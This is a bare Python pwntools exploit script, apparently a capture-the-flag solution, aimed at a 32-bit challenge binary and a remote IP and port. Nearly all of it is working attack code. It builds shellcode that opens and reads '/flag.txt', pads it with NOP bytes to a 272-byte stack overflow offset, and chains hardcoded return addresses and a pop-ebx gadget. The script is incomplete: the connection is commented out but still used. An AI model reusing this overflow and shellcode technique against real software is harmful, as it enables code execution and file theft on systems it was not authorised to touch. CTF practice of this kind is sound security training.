#!/usr/bin/env python3
from pwn import *
                                            
# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-l", "175"]
host, port = '5.223.57.169', 11324

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    # io = initialize()
    rop = ROP(exe)
    offset = 272
    assembly = shellcraft.open('/flag.txt', 0)
    assembly += shellcraft.sendfile(1, 'eax', 0, 500)

    shellcode = asm(assembly)
    pop_ebx = 0x0804901e
    input = shellcode.ljust(offset, b"\x90") + p32(elf.sym["_start"] + 44)*0x40 + p32(elf.sym["main"] + 137) + p32(pop_ebx)
    print("Input hex:", input.hex())
    # io = initialize([input])
    io.interactive()
    
if __name__ == '__main__':
    exploit()